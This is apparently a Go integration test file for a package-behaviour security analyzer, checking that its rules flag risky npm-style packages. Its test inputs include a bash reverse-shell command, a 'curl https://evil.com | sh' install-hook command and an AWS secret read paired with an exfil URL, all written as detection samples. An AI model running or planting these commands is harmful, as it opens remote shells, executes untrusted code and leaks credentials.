package analyzer

import (
	"strings"
	"testing"
)

func TestIntegration_CredentialExfiltration(t *testing.T) {
	a := New()
	report := a.Analyze(&BehaviorData{
		PackageName:  "exfil-pkg",
		Version:      "1.0.0",
		EnvVarsRead:  []string{"AWS_SECRET_ACCESS_KEY"},
		NetworkCalls: []string{"http://192.168.1.1/exfil"},
	})

	if report.RiskLevel != "CRITICAL" {
		t.Errorf("RiskLevel = %q, want CRITICAL (score=%d)", report.RiskLevel, report.RiskScore)
	}

	foundCredRule := false
	foundNetRule := false
	for _, m := range report.Matches {
		if m.Rule.ID == "exfiltration-env-credentials" {
			foundCredRule = true
		}
		if m.Rule.ID == "network-suspicious-domain" {
			foundNetRule = true
		}
	}
	if !foundCredRule {
		t.Error("expected exfiltration-env-credentials rule to trigger")
	}
	if !foundNetRule {
		t.Error("expected network-suspicious-domain rule to trigger")
	}
}

func TestIntegration_ReverseShellAttempt(t *testing.T) {
	a := New()
	report := a.Analyze(&BehaviorData{
		PackageName:   "revshell-pkg",
		Version:       "1.0.0",
		ShellCommands: []string{"bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"},
	})

	foundShellRule := false
	for _, m := range report.Matches {
		if m.Rule.ID == "shell-reverse-shell" {
			foundShellRule = true
		}
	}
	if !foundShellRule {
		t.Error("expected shell-reverse-shell rule to trigger")
	}
	if report.RiskLevel != "CRITICAL" {
		t.Errorf("RiskLevel = %q, want CRITICAL", report.RiskLevel)
	}
}

func TestIntegration_CleanPackage(t *testing.T) {
	a := New()
	report := a.Analyze(&BehaviorData{
		PackageName: "lodash",
		Version:     "4.17.21",
	})

	if len(report.Matches) != 0 {
		t.Errorf("clean package: got %d matches, want 0", len(report.Matches))
		for _, m := range report.Matches {
			t.Logf("  unexpected match: %s (%s)", m.Rule.Name, m.Rule.ID)
		}
	}
	if report.RiskScore != 0 {
		t.Errorf("clean package: RiskScore = %d, want 0", report.RiskScore)
	}
	if report.RiskLevel != "LOW" {
		t.Errorf("clean package: RiskLevel = %q, want LOW", report.RiskLevel)
	}
}

func TestIntegration_PostInstallWithShell(t *testing.T) {
	a := New()
	report := a.Analyze(&BehaviorData{
		PackageName:     "postinstall-pkg",
		Version:         "1.0.0",
		HasInstallHooks: true,
		ShellCommands:   []string{"curl https://evil.com | sh"},
	})

	foundPostinstall := false
	foundShellExec := false
	for _, m := range report.Matches {
		if m.Rule.ID == "postinstall-script" {
			foundPostinstall = true
		}
		if m.Rule.ID == "shell-command-execution" {
			foundShellExec = true
		}
	}
	if !foundPostinstall {
		t.Error("expected postinstall-script rule to trigger")
	}
	if !foundShellExec {
		t.Error("expected shell-command-execution rule to trigger")
	}
	if report.RiskScore < 50 {
		t.Errorf("RiskScore = %d, want >= 50 (two HIGH rules)", report.RiskScore)
	}
}

func TestIntegration_DynamicCodeExecution(t *testing.T) {
	a := New()
	report := a.Analyze(&BehaviorData{
		PackageName:     "eval-pkg",
		Version:         "1.0.0",
		SuspiciousFiles: []string{"node_modules/evil/index.js contains eval("},
	})

	foundEval := false
	for _, m := range report.Matches {
		if m.Rule.ID == "dynamic-code-eval" {
			foundEval = true
		}
	}
	if !foundEval {
		t.Error("expected dynamic-code-eval rule to trigger")
	}
}

func TestIntegration_FullReportRoundTrip(t *testing.T) {
	a := New()
	report := a.Analyze(&BehaviorData{
		PackageName:     "full-test",
		Version:         "3.0.0",
		HasInstallHooks: true,
		ShellCommands:   []string{"npm rebuild"},
		NetworkCalls:    []string{"https://registry.npmjs.org"},
	})

	output := report.FormatReport()

	if !strings.Contains(output, "full-test@3.0.0") {
		t.Error("report missing package header")
	}
	if !strings.Contains(output, "Behavior Summary:") {
		t.Error("report missing behavior summary section")
	}
	if !strings.Contains(output, "Triggered Rules:") && !strings.Contains(output, "No rules triggered") {
		t.Error("report missing rules section")
	}
	if !strings.Contains(output, "Risk Score:") {
		t.Error("report missing risk score")
	}
}
